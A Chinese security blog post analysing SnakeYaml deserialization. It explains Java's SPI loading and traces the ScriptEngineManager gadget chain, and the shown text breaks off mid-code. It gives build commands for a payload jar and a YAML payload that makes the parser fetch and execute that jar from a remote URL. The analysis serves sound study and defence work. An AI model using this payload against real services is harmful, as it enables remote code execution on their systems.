<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>[Java反序列化]—SnakeYaml反序列化 - 编程中国的博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="[Java反序列化]—SnakeYaml反序列化" />
<meta property="og:description" content="文章首发于跳跳糖：SnakeYaml反序列化及不出网利用
SPI 正文之前先了解一下SPI机制。
SPI全称Service Provider Interface，是Java提供的一套用来被第三方实现或者扩展的接口，它可以用来启用框架扩展和替换组件。 SPI的作用就是为这些被扩展的API寻找服务实现。
API （Application Programming Interface）在大多数情况下，都是实现方制定接口并完成对接口的实现，调用方仅仅依赖接口调用，且无权选择不同实现。 从使用人员上来说，API 直接被应用开发人员使用。SPI （Service Provider Interface）是调用方来制定接口规范，提供给外部来实现，调用方在调用时则选择自己需要的外部实现。 从使用人员上来说，SPI 被框架扩展人员使用。 简单实现 接口
package snakeYaml.SPI; public interface SpiService { public void say(); } 实现类
SPI1
package snakeYaml.SPI; public class SPI1 implements SpiService{ @Override public void say() { System.out.println(&#34;This is SPI-&gt;1&#34;); } } SPI2
package snakeYaml.SPI; public class SPI2 implements SpiService{ @Override public void say() { System.out.println(&#34;This is SPI-&gt;2&#34;); } } 在classpath下面创建目录META-INF/services/，在下面创建文件名是上述接口全限定名的文件，在此文件中写入此接口的实现类的全限定名：
测试" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/6246b7cf4aceed78528c18dfa27cfd36/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-11-20T12:36:56+08:00" />
<meta property="article:modified_time" content="2022-11-20T12:36:56+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程中国的博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程中国的博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">[Java反序列化]—SnakeYaml反序列化</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <blockquote> 
 <p>文章首发于跳跳糖：<a href="https://tttang.com/archive/1815/" rel="nofollow">SnakeYaml反序列化及不出网利用</a></p> 
</blockquote> 
<h2><a id="SPI_2"></a>SPI</h2> 
<p>正文之前先了解一下SPI机制。</p> 
<p>SPI全称Service Provider Interface，是Java提供的一套用来被第三方实现或者扩展的接口，它可以用来启用框架扩展和替换组件。 SPI的作用就是为这些被扩展的API寻找服务实现。</p> 
<ul><li>API （<code>Application Programming Interface）在</code>大多数情况下，都是<code>实现方</code>制定接口并完成对接口的实现，<code>调用方</code>仅仅依赖接口调用，且无权选择不同实现。 从使用人员上来说，API 直接被应用开发人员使用。</li><li>SPI （<code>Service Provider Interface）</code>是<code>调用方</code>来制定接口规范，提供给外部来实现，<code>调用方在调用时则</code>选择自己需要的外部实现。 从使用人员上来说，SPI 被框架扩展人员使用。</li></ul> 
<h3><a id="_11"></a>简单实现</h3> 
<p><strong>接口</strong></p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">snakeYaml<span class="token punctuation">.</span></span><span class="token constant">SPI</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">SpiService</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><strong>实现类</strong></p> 
<p>SPI1</p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">snakeYaml<span class="token punctuation">.</span></span><span class="token constant">SPI</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SPI1</span> <span class="token keyword">implements</span> <span class="token class-name">SpiService</span><span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"This is SPI-&gt;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>SPI2</p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">snakeYaml<span class="token punctuation">.</span></span><span class="token constant">SPI</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SPI2</span> <span class="token keyword">implements</span> <span class="token class-name">SpiService</span><span class="token punctuation">{<!-- --></span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"This is SPI-&gt;2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>在classpath下面创建目录<code>META-INF/services/</code>，在下面创建文件名是上述接口全限定名的文件，在此文件中写入此接口的实现类的全限定名：</p> 
<p><img src="https://images2.imgbox.com/d1/5e/3FpWvq8q_o.png" alt="image-20221111130904324.png"></p> 
<p><strong>测试</strong></p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">snakeYaml<span class="token punctuation">.</span></span><span class="token constant">SPI</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Iterator</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ServiceLoader</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpiDemo</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
       <span class="token class-name">ServiceLoader</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SpiService</span><span class="token punctuation">&gt;</span></span> serviceLoader <span class="token operator">=</span> <span class="token class-name">ServiceLoader</span><span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token class-name">SpiService</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//        for (SpiService spiService : serviceLoader) {<!-- --></span>
<span class="token comment">//            spiService.say();</span>
<span class="token comment">//        }</span>
         <span class="token class-name">Iterator</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SpiService</span><span class="token punctuation">&gt;</span></span> iterator <span class="token operator">=</span> serviceLoader<span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>iterator<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token class-name">SpiService</span> spiService <span class="token operator">=</span> iterator<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            spiService<span class="token punctuation">.</span><span class="token function">say</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h3><a id="RCE_78"></a>RCE</h3> 
<p>如果存在任意文件写入的话，即构造一个恶意类，并添加到classpath下，导致代码执行</p> 
<p>此时将将SPI1中say方法的内容改为calc，当运行后则会造成代码执行</p> 
<p><img src="https://images2.imgbox.com/7a/77/qzZqYUoM_o.png" alt="image-20221111140117920.png"></p> 
<h4><a id="_86"></a>流程分析</h4> 
<p>SPI的核心的逻辑是 <code>ServiceLoader.load()</code> 方法，在<code>ServiceLoader</code>中，存储了默认路径<code>META-INF/services</code></p> 
<p><img src="https://images2.imgbox.com/40/15/0CH1XIKg_o.png" alt="image-20221111162142297.png"></p> 
<p>获取到默认路径后断点打到hastNext()上，跟进看一下</p> 
<p><img src="https://images2.imgbox.com/f6/35/hhm5c0MP_o.png" alt="image-20221111164736115.png"></p> 
<p>调用了<code>hasNextService()</code></p> 
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>acc <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> <span class="token function">hasNextService</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
</code></pre> 
<p>接着将默认值<code>PREFIX</code>和在<code>ServiceLoader.load()</code> 中获取到的类名进行拼接，得到犬类名</p> 
<p><img src="https://images2.imgbox.com/b0/4a/yAwNF7J9_o.png" alt="image-20221111164948141.png"></p> 
<p>接着调用下边<code>parse()</code>，configs是348行获取到的全类名的资源</p> 
<pre><code class="prism language-java">pending <span class="token operator">=</span> <span class="token function">parse</span><span class="token punctuation">(</span>service<span class="token punctuation">,</span> configs<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>跟进后发现通过IO流读取到了，文件中的内容，并通过迭代器逐一返回</p> 
<p><img src="https://images2.imgbox.com/13/0d/bqiO6SnK_o.png" alt="image-20221111165301209.png"></p> 
<p>接着就到了下边的next方法</p> 
<p><img src="https://images2.imgbox.com/c7/6c/r7bTaO5z_o.png" alt="image-20221111160133961.png"></p> 
<p>再跟进<code>next()</code>，其中返回值是<code>nextService()</code></p> 
<p><img src="https://images2.imgbox.com/e5/b5/suEY6SVn_o.png" alt="image-20221111160206652.png"></p> 
<p>继续跟进<code>nextService()</code>，首先获取要调用的类名也就是SPI1，通过反射获取该类，接着通过newInstance进行实例化，并retrun返回</p> 
<p><img src="https://images2.imgbox.com/42/84/cXBteiBd_o.png" alt="image-20221111160603135.png"></p> 
<p>获取到该类后，调用该类的say方法，弹出计算器</p> 
<p><img src="https://images2.imgbox.com/82/41/M4mIld26_o.png" alt="image-20221111160740588.png"></p> 
<h2><a id="SnakeYaml_136"></a>SnakeYaml</h2> 
<p>SnakeYaml是一个完整的YAML1.1规范Processor，用于解析YAML，序列化以及反序列化，支持UTF-8/UTF-16，支持Java对象的序列化/反序列化，支持所有YAML定义的类型。</p> 
<p><a href="https://www.yiibai.com/yaml" rel="nofollow">YAML教程 (yiibai.com)</a></p> 
<p><strong>依赖</strong></p> 
<pre><code class="prism language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.mchange<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>c3p0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>0.9.5.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre> 
<p>SnakeYaml有2个方法：</p> 
<ul><li>Yaml.load()：入参是一个字符串或者一个文件，返回一个Java对象；</li><li>Yaml.dump()：将一个对象转化为yaml文件形式</li></ul> 
<h3><a id="load_157"></a>load()</h3> 
<p><strong>User类</strong></p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">snakeYaml</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

</code></pre> 
<p><strong>测试</strong></p> 
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SnakeYamlDemo</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">User</span> user1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        user1<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span><span class="token string">"Sentiment"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Yaml</span> yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>yaml<span class="token punctuation">.</span><span class="token function">dump</span><span class="token punctuation">(</span>user1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><strong>结果</strong></p> 
<pre><code class="prism language-java"><span class="token operator">!</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">snakeYaml<span class="token punctuation">.</span></span>User</span> <span class="token punctuation">{<!-- --></span>name<span class="token operator">:</span> <span class="token class-name">Sentiment</span><span class="token punctuation">}</span>
</code></pre> 
<p><code>!!</code>用于强制类型转换，与fastjson中@type字段类似，<code>!!snakeYaml.User</code>的意思是转换为User类。</p> 
<h3><a id="dump_202"></a>dump()</h3> 
<p>将User类改为</p> 
<pre><code class="prism language-java"><span class="token keyword">package</span> <span class="token namespace">snakeYaml</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"User无参构造器"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"User.setName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"User.getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>此时执行dump</p> 
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SnakeYamlDemo</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token class-name">Yaml</span> yaml <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Yaml</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token string">"!!snakeYaml.User {name: Sentiment}"</span><span class="token punctuation">;</span>
        <span class="token class-name">User</span> user2 <span class="token operator">=</span> yaml<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>user2<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><strong>结果</strong></p> 
<pre><code class="prism language-java"><span class="token class-name">User</span>无参构造器
<span class="token class-name">User</span><span class="token punctuation">.</span>setName
<span class="token class-name"><span class="token namespace">snakeYaml<span class="token punctuation">.</span></span>User</span><span class="token annotation punctuation">@66cd51c3</span>
</code></pre> 
<p>和fastjson、jackson一样。调用了无参构造器和<code>setter</code></p> 
<p>而这里有一个问题：</p> 
<p>四种属性修饰，<code>private,protected,public,default</code>，若属性设置为public，则不会调用对应的setter方法</p> 
<p>调试了一下发现：</p> 
<p>当属性为public时，是通过反射对<code>Field</code>进行了<code>set</code></p> 
<p><img src="https://images2.imgbox.com/9b/6b/mkDtbPdT_o.png" alt="image-20221111150212658.png"></p> 
<p>而当属性为private时，是通过反射调用<code>setName</code>设置的值</p> 
<p><img src="https://images2.imgbox.com/2d/17/stfJYNjG_o.png" alt="image-20221111150404075.png"></p> 
<h2><a id="SnakeYaml_265"></a>SnakeYaml反序列化</h2> 
<p>影响版本：全版本</p> 
<h3><a id="_269"></a>漏洞原理</h3> 
<p>yaml反序列化时可以通过<code>!!</code>+全类名指定反序列化的类，反序列化过程中会实例化该类，可以通过构造<code>ScriptEngineManager</code>payload并利用SPI机制通过<code>URLClassLoader</code>或者其他payload如JNDI方式远程加载实例化恶意类从而实现任意代码执行。</p> 
<h3><a id="_273"></a>漏洞复现</h3> 
<p>常用的方式就是通过javax.script.ScriptEngineManager的利用链通过URLClassLoader实现的代码执行。</p> 
<p><a href="https://github.com/artsploit/yaml-payload">github</a>上已经有现成的利用ScriptEngineManager利用方式的exp</p> 
<p>直接修改要执行的命令即可，除此外可以发现旁边的<code>META-INF.services</code>目录以及其中的文件，由此也可以证明ScriptEngineManager攻击链是通过SPI机制实现的</p> 
<p><img src="https://images2.imgbox.com/7c/f6/oVl790Yr_o.png" alt="image-20221111154635145.png"></p> 
<p>根据项目中的提示，编译文件,会生成yaml-payload.jar包</p> 
<pre><code class="prism language-java">javac src<span class="token operator">/</span>artsploit<span class="token operator">/</span><span class="token class-name">AwesomeScriptEngineFactory</span><span class="token punctuation">.</span>java
jar <span class="token operator">-</span>cvf yaml<span class="token operator">-</span>payload<span class="token punctuation">.</span>jar <span class="token operator">-</span><span class="token class-name">C</span> src<span class="token operator">/</span> <span class="token punctuation">.</span>
</code></pre> 
<p>本地开启监听服务</p> 
<pre><code class="prism language-java">python <span class="token operator">-</span>m http<span class="token punctuation">.</span>server <span class="token number">7777</span>
</code></pre> 
<p>payload:</p> 
<pre><code class="prism language-JAVA">!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://127.0.0.1:7777/yaml-payload.jar"]
  ]]
]
</code></pre> 
<p>成功弹出计算器</p> 
<p><img src="https://images2.imgbox.com/07/e9/wo8bkylR_o.png" alt="image-20221111155254025.png"></p> 
<h3><a id="ScriptEngineManager_310"></a>ScriptEngineManager</h3> 
<p>先看下<code>ScriptEngineManager</code>是如何通过SPI进行恶意执行的</p> 
<p>先调用了init()，进行一些初始化设置之后调用<code>initEngines()</code></p> 
<p><img src="https://images2.imgbox.com/af/6c/PRlqobXR_o.png" alt="image-20221111170058374.png"></p> 
<p>跟进在下边调用了<code>return getServiceLoader(loader);</code>，接着就是<code>ServiceLoader.load()</code>，对我们自定义的类进行初始化</p> 
<p><img src="https://images2.imgbox.com/25/45/vnU0zZ8b_o.png" alt="image-20221111170422430.png"></p> 
<p>初始化完成后，向下执行又看到了两个熟悉的方法<code>hasNext()</code>、<code>next()</code>(SPI中介绍过)</p> 
<p>hashNext获取全路径，并读取文件中的内容</p> 
<p>next执行文件中对应的类，导致恶意代码执行</p> 
<p><img src="https://images2.imgbox.com/99/04/qd8Rzqj6_o.png" alt="image-20221111170636508.png"></p> 
<h3><a id="_330"></a>反序列化流程</h3> 
<p>接着看一下如何通过<code>load()</code>进行反序列化调用远程jar包的</p> 
<pre><code class="prism language-java"><span class="token keyword">public</span> <span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">T</span><span class="token punctuation">&gt;</span></span> <span class="token class-name">T</span> <span class="token function">load</span><span class="token punctuation">(</span><span class="token class-name">String</span> yaml<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">)</span> <span class="token function">loadFromReader</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StreamReader</span><span class="token punctuation">(</span>yaml<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>先跟进<code>StreamReader()</code>，通过<code>StringReader</code>处理我们传入的字符串，将poc存储在StreamReader的this.stream字段值里。</p> 
<p><img src="https://images2.imgbox.com/b3/0f/VO5PAUwc_o.png" alt="image-20221111192752162.png"></p> 
<p>接着回到<code>loadFromReader()</code>，首先创建一个Composer对象，并将其封装到<code>constructor()</code>中</p> 
<pre><code class="prism language-java"><span class="token keyword">private</span> <span class="token class-name">Object</span> <span class="token function">loadFromReader</span><span class="token punctuation">(</span><span class="token class-name">StreamReader</span> sreader<span class="token punctuation">,</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">&gt;</span></span> type<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
    <span class="token class-name">Composer</span> composer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Composer</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ParserImpl</span><span class="token punctuation">(</span>sreader<span class="token punctuation">)</span><span class="token punctuation">,</span> resolver<span class="token punctuation">,</span> loadingConfig<span class="token punctuation">)</span><span class="token punctuation">;</span>
    constructor<span class="token punctuation">.</span><span class="token function">setComposer</span><span class="token punctuation">(</span>composer<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> constructor<span class="token punctuation">.</span><span class="token function">getSingleData</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>跟进<code>getSingleData()</code></p> 
<p><img src="https://images2.imgbox.com/48/ed/i7e8rvZR_o.png" alt="image-20221111195259054.png"></p> 
<p>调用<code>getSingleNode()</code>将刚刚传入的payload的!!,变为如下这种带tag的表示，因此存在bypass方式(可参考<a href="https://b1ue.cn/archives/407.html" rel="nofollow">浅蓝师傅的文章</a>)，这个后文再提。</p> 
<p><img src="https://images2.imgbox.com/4d/7c/DwA65UY3_o.png" alt="image-20221111195726263.png"></p> 
<p>所以现在的payload就变为了：</p> 
<pre><code class="prism language-java"><span class="token operator">&lt;</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>yaml<span class="token punctuation">.</span>snakeyaml<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span></span>SequenceNode</span> <span class="token punctuation">(</span>tag<span class="token operator">=</span>tag<span class="token operator">:</span>yaml<span class="token punctuation">.</span>org<span class="token punctuation">,</span><span class="token number">2002</span><span class="token operator">:</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>yaml<span class="token punctuation">.</span>snakeyaml<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span></span>SequenceNode</span> <span class="token punctuation">(</span>tag<span class="token operator">=</span>tag<span class="token operator">:</span>yaml<span class="token punctuation">.</span>org<span class="token punctuation">,</span><span class="token number">2002</span><span class="token operator">:</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URLClassLoader</span><span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>yaml<span class="token punctuation">.</span>snakeyaml<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span></span>SequenceNode</span> <span class="token punctuation">(</span>tag<span class="token operator">=</span>tag<span class="token operator">:</span>yaml<span class="token punctuation">.</span>org<span class="token punctuation">,</span><span class="token number">2002</span><span class="token operator">:</span>seq<span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>yaml<span class="token punctuation">.</span>snakeyaml<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span></span>SequenceNode</span> <span class="token punctuation">(</span>tag<span class="token operator">=</span>tag<span class="token operator">:</span>yaml<span class="token punctuation">.</span>org<span class="token punctuation">,</span><span class="token number">2002</span><span class="token operator">:</span>java<span class="token punctuation">.</span>net<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">,</span> value<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">&lt;</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>yaml<span class="token punctuation">.</span>snakeyaml<span class="token punctuation">.</span>nodes<span class="token punctuation">.</span></span>ScalarNode</span> <span class="token punctuation">(</span>tag<span class="token operator">=</span>tag<span class="token operator">:</span>yaml<span class="token punctuation">.</span>org<span class="token punctuation">,</span><span class="token number">2002</span><span class="token operator">:</span>str<span class="token punctuation">,</span> value<span class="token operator">=</span>http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token operator">:</span><span class="token 